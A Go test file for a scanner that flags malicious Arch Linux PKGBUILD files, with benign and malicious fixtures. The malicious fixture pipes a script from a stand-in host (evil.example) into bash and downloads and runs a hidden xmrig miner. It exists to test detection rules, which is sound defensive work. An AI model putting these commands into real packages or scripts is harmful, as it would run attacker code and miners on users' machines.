package scan

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

const benignPKGBUILD = `pkgname=hello
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=("hello-1.0.tar.gz")
sha256sums=('SKIP')

build() {
  cd "$pkgname-$pkgver"
  ./configure --prefix=/usr
  make
}

package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
  install -Dm644 README.md "$pkgdir/usr/share/doc/$pkgname/README.md"
  rm -rf "$pkgdir/usr/share/doc/$pkgname/.git"
}
`

const maliciousPKGBUILD = `pkgname=totally-legit
pkgver=1.0
pkgrel=1

package() {
  curl -s https://evil.example/payload.sh | bash
  mkdir -p ~/.config/autostart
  curl -s https://evil.example/xmrig -o /tmp/.x && chmod +x /tmp/.x && nohup /tmp/.x &
}
`

func writeFixture(t *testing.T, name, content string) string {
	t.Helper()
	dir := t.TempDir()
	require.NoError(t, os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644))
	return dir
}

func TestStaticDetectsRemoteExec(t *testing.T) {
	dir := writeFixture(t, "PKGBUILD", maliciousPKGBUILD)
	findings, err := Static(dir)
	require.NoError(t, err)
	require.NotEmpty(t, findings)

	byRule := map[string]Finding{}
	for _, f := range findings {
		byRule[f.Rule] = f
	}
	assert.Contains(t, byRule, "remote-exec-pipe")
	assert.Contains(t, byRule, "persistence-autostart")
	assert.Equal(t, VerdictMalicious, FindingsVerdict(findings))
	for _, f := range findings {
		assert.Equal(t, "static", f.Source)
		assert.Equal(t, "PKGBUILD", f.File)
		assert.Positive(t, f.Line)
	}
}

func TestStaticBenignPKGBUILDIsClean(t *testing.T) {
	dir := writeFixture(t, "PKGBUILD", benignPKGBUILD)
	findings, err := Static(dir)
	require.NoError(t, err)
	for _, f := range findings {
		assert.NotEqual(t, SeverityCritical, f.Severity, "false positive: %+v", f)
	}
	assert.Equal(t, VerdictClean, FindingsVerdict(findings))
}

func TestStaticPersistenceMentionIsNotCritical(t *testing.T) {
	// Install-time advice is not a persistence write and must not block a build.
	dir := writeFixture(t, "PKGBUILD", `post_install() {
  echo "Add 'alias foo=bar' to ~/.bashrc to enable completions"
  echo "Then restart your shell"
}
`)
	findings, err := Static(dir)
	require.NoError(t, err)
	for _, f := range findings {
		assert.NotEqual(t, "persistence-autostart", f.Rule)
		assert.NotEqual(t, SeverityCritical, f.Severity)
	}
}

func TestStaticTLSAndChecksumRules(t *testing.T) {
	dir := writeFixture(t, "PKGBUILD", `source=("https://example.com/a.tar.gz")
sha256sums=('SKIP')
prepare() {
  curl -k -s https://example.com/patch -o fix.patch
}
`)
	findings, err := Static(dir)
	require.NoError(t, err)
	byRule := map[string]Finding{}
	for _, f := range findings {
		byRule[f.Rule] = f
	}
	assert.Contains(t, byRule, "tls-verification-disabled")
	assert.Equal(t, SeverityWarning, byRule["tls-verification-disabled"].Severity)
	assert.Contains(t, byRule, "checksum-skipped")
	assert.Equal(t, SeverityInfo, byRule["checksum-skipped"].Severity)
	assert.Equal(t, VerdictSuspicious, FindingsVerdict(findings))
}

func TestScannerReportsAndPersists(t *testing.T) {
	dir := writeFixture(t, "PKGBUILD", maliciousPKGBUILD)
	reportDir := t.TempDir()
	report, err := New(Options{Package: "evil", Dir: dir, ReportDir: reportDir}).Run(context.Background())
	require.NoError(t, err)
	assert.Equal(t, VerdictMalicious, report.Verdict)
	assert.NotEmpty(t, report.Findings)
	assert.NotEmpty(t, report.ContentHash)

	data, readErr := os.ReadFile(ReportPath(reportDir, report.Package))
	require.NoError(t, readErr)
	assert.Contains(t, string(data), `"verdict": "malicious"`)
}

func TestScannerMissingDirIsNotClean(t *testing.T) {
	report, err := New(Options{Package: "ghost", Dir: filepath.Join(t.TempDir(), "missing")}).
		Run(context.Background())
	require.Error(t, err)
	assert.Equal(t, VerdictUnknown, report.Verdict, "an unreadable package must never report clean")
	assert.NotEmpty(t, report.Error)
}
